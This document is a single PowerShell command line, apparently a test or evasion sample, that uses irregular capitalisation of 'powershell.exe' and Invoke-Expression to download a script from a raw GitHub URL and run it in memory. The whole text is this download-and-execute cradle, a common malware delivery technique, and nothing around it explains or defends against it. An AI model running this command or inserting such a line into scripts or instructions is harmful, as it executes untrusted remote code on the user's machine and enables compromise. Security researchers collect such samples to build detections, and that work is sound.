powErShEll.ExE -Command "iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/vinod50rao/PS-Test/master/ps-file'))";
